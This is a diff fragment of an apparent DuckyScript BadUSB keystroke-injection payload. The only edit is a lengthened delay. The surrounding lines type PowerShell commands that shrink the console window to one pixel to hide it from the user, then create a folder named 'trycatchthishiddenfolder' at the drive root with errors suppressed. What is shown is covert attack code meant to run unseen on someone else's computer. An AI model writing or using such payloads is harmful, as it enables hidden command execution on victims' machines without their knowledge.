@@ -7,7 +7,7 @@ ENTER
 DELAY 4000
 LEFTARROW
 ENTER
-DELAY 500
+DELAY 2000
 STRINGLN $pshost = get-host;$pswindow = $pshost.ui.rawui;$newsize = $pswindow.buffersize;$newsize.height = 3000;$newsize.width = 150;$pswindow.buffersize = $newsize;$newsize = $pswindow.windowsize;$newsize.height = 1;$newsize.width = 1;$pswindow.windowsize = $newsize
 STRINGLN cd \
 STRINGLN New-Item -ItemType Directory -Force -Path "trycatchthishiddenfolder" -ErrorAction SilentlyContinue
